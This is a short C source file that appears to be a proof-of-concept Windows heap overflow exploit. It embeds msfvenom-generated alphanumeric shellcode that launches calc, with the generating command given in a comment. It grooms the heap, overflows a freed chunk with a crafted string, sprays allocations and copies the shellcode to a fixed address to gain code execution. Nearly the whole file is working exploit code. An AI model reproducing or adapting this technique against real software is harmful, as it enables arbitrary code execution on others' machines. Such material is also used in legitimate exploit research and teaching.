#include <windows.h>
int main()
{
	//msfvenom -p windows/exec cmd=calc -e x86/alpha_mixed bufferregister=ecx -f raw
	const char s[] = "IIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI9lm8orGps07p1pmYJEFQ9PQtlKbpP0lKcbVlNkV2tTlKbRq84OmgSzvFvQioLlGL1qalUR4lEpJajovmWq9WJBybQBSglK1BtPlKaZullKPLfq0xysQXC1hQV1nk3iQ05QxSLKw9fx9sTzqYLKEdLKWqxVVQ9oNLiQXODMwqhGTxypT5kFwsQmyheksMDd2U8dbxNkChEt5QHSe6NkDLPKnkchuL7qiCnkgtNkWqHPlIRdEtDdqK3kpa69Rz0QIoKPSo3o0ZlKdRZKNmsmPjFaNmmUX230c0S060e85aLKpoowioXUmk8pmenB3fqxoVlUoMMMKO9EElc6QlFjK0ik9pbUWuoKCwGcSBrOPj3063YoJuasSQ2LSSc0AA";
	void* h = HeapCreate(0, 0, 0);
	char* f[6];
	int i;
	for (i = 0; i < 6; i++) f[i] = HeapAlloc(h, 0, 2 * 8 - 8);
	for (i = 0; i < 5; i++) HeapFree(h, 0, f[i]);
	strcpy(HeapAlloc(h, 0, 2 * 8 - 8), "jjjjjjjj8!"); //heap overflow
	for (i = 0; i < 10000; i++) HeapAlloc(h, 0, 1024 * 4);
	strcpy((char*)0x01000000, s);
	for (i = 0; i < 4; i++) HeapAlloc(h, 0, 2 * 8 - 8);
	HeapAlloc(h, 0, 1024 * 8);
}
